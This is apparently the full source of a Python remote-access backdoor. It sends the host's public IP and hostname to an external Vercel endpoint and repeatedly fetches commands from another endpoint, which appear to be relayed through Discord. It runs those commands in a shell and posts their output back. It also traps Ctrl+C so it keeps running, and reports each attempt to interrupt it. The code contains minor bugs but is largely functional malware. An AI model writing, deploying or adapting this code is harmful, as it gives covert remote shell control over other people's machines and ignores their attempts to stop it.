try:
    from requests import get, post
    from time import sleep
    from subprocess import check_output as system
    from os import chdir, uname

    old_command = ""
    command = ""

    ip = get('https://api.ipify.org').content.decode('utf8')
    hostname = uname()[1]
    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"New client IP: `{ip}@{hostname}`")
except KeyboardInterrupt:
    try:
        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname} ``Client tried to SIGINT(Ctrl+C) when init``")
        pass
    except KeyboardInterrupt:
        pass
    pass

while True:
    # prevent keyboardinterrupt
    try:
        #get HTML
        try:
            command = get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode()
            if command.startswith('Error: 429 - {"message": "You are being rate limited.", "retry_after":'):
                try:
                    sleep(5)
                    continue
                except KeyboardInterrupt:
                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when waiting discord api timeout(rate-limit)``")
        except KeyboardInterrupt:
            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
            continue
        except:
            print("Failed to connect to server")
            sleep(3)
            continue
            # execute command
        if old_command != command:
            try:
                if command.startswith("execute "):
                    if command.split()[1] == hostname:
                         pass
                    else:
                        old_command = command
                        continue
                if command.startswith("ping"):
                    try:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: Pong!")
                    except KeyboardInterrupt:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
                    except:
                        print("Failed to connect to server")
                        continue
                if command.startswith("cd"):
                    dir=command.replace('cd', '')
                    try:
                        chdir(dir)
                    except KeyboardInterrupt:
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
                        except KeyboardInterrupt:
                            continue
                        continue
                    except FileNotFoundError:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```No Such Directory```-{ip}@{hostname}")
                    except:
                        print("Failed to connect to server")
                        continue
                old_command = command
                try:
                    cmdout = system(command, shell=True).decode()
                except subprocess.CalledProcessError as e:
                    try:
                        global sperror
                        sperror=True
                    except KeyboardInterrupt:
                        continue
                    try:
                        if e.output != "":
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: {e.output} exited with code {e.returncode}```- {ip}@{hostname}")
                        else:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: exited with no output and code {e.returncode}```- {ip}@{hostname}")
                    except KeyboardInterrupt:
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post (error)output``")
                        except KeyboardInterrupt:
                                continue
                        continue
                    except:
                        print("Failed to sent (error)output")
                        continue
                except KeyboardInterrupt:
                    try:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to execute command``")
                    except KeyboardInterrupt:
                            continue
                    continue

                if not sperror:
                    if cmdout != "":
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```{cmdout}```- {ip}@{hostname}")
                        except KeyboardInterrupt:
                            try:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                            except KeyboardInterrupt:
                                    continue
                            continue
                        except:
                            print("Failed to sent output")
                            continue
                    else:
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Command Executed successfully without output```- {ip}@{hostname}")
                        except KeyboardInterrupt:
                            try:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                            except KeyboardInterrupt:
                                    continue
                            continue
                        except:
                            print("Failed to sent output")
                            continue
                old_command = command
                continue
            except:
                continue
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            try:
                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C)``")
            except KeyboardInterrupt:
                continue
            continue
    except KeyboardInterrupt:
        try:
            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C)``")
        except KeyboardInterrupt:
            continue
        continue
